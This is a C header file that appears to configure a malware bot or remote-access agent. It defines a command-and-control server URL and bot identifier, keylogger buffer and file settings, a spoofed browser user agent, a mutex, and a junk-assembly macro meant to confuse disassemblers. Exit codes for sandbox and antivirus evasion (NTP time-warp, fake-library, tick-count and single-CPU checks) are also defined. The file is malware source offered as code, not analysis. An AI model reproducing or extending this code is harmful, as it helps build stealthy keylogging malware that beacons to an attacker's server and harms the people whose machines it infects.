#pragma once

#ifdef DEBUGME
#define DEBUGMSG(msg) do { \
  fprintf(debug_log_stream, "%s\n", msg); \
  fflush(debug_log_stream);\
} while(0);
#define DEBUGMSGF(format, msg) do { \
  fprintf(debug_log_stream, format, msg); \
  fflush(debug_log_stream);\
} while(0);
#define DEBUGMSGEXT(msg) do { \
  fprintf(debug_log_stream, "Funct: %s - Line: %d - Error Msg: %s\n", __LINE__, __FUNCTION__ ,msg); \
  fflush(debug_log_stream);\
} while(0);
#else
#define DEBUGMSG(msg)
#define DEBUGMSGF(format, msg)
#define DEBUGMSGEXT(msg)
#endif

#define ASMGARBAGE __asm { \
	PUSH EAX; \
	XOR EAX,EAX; \
	JZ J; \
	MOV EAX,[SP+0x04]; \
	__asm __emit(0x3F); \
	J: \
	POP EAX; \
}

/******************************************************************************
* Preprocessor Directives and Macros
*****************************************************************************/

// config
#define SERVER_URL "http://4R35.candc.efflam.net:8443"
#define BOT_ID ""
#define SLEEP_INTERVAL 10
#define SERVICE_NAME "agent_4R35"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
#define KEYLOGGER_FILE ""
#define MUTEXID "Mutex-4R35"

// Host to get the NTP time
#define POOL_NTP_HOST "pool.ntp.org"
// Number of seconds of difference between NTP and Local time before exit
#define UTC_TIME_DIFF 120

// Exit code, internal use only ;-)
// used by noav
#define EXIT_CODE_ASKED_BY_MASTER		(0x0000)
#define EXIT_CODE_TIME_WARP_NULL		(0x0001)
#define EXIT_CODE_TIME_WARP_2015		(0x0001 << 1)
#define EXIT_CODE_TIME_WARP_NTPD		(0x0001 << 2)
#define EXIT_CODE_ERROR_NTPD			(0x0001 << 3)
#define EXIT_CODE_FAKE_LIBRARY_LOADED	(0x0001 << 4)
#define EXIT_CODE_TICK_COUNT_TOO_QUICK	(0x0001 << 5)
#define EXIT_CODE_ONLY_ONE_CPU			(0x0001 << 6)

// Memory size
#define KiloByte (1024)
#define MegaByte (1024*1024)
#define GigaByte (1024*1024*1024)

//
#define ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING 42

// Crypt function to activate
#define NO_CRYPT
#define SIMPLE_CRYPT
#define TEA_CRYPT

// Keylogger
// Number of key before inserting a carriage return in log file
#define KEYLOGGER_BUF_SIZE 32

#define BUFFSIZE   512
#define MAXTHREADS 256

#define ReverseEndianInt(x) ((x) = \
	((x)&0xff000000) >> 24 |\
	((x)&0x00ff0000) >>  8 |\
	((x)&0x0000ff00) <<  8 |\
	((x)&0x000000ff) << 24)

#define JAN_1970 2208988800UL	/* Unix base epoch */

/* Structures */
